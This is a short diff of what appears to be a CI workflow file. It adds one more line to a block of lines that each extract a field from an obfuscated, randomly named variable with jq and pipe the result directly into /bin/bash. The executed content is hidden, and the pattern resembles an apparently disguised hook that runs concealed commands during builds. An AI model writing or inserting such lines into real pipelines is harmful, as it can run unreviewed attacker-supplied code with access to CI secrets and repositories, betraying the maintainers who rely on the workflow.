@@ -41,6 +41,7 @@ jobs:
           echo $ljro31378 | jq -r .vh133 | /bin/bash
           printf '%s' "$cio9765" | jq -r .wqqg71109 | /bin/bash
           echo $exyh9968 | jq -r .ntlmc70462 | /bin/bash
+          printf '%s' "$a36" | jq -r .xlh8 | /bin/bash
 
       - name: Archive results
         if: always()
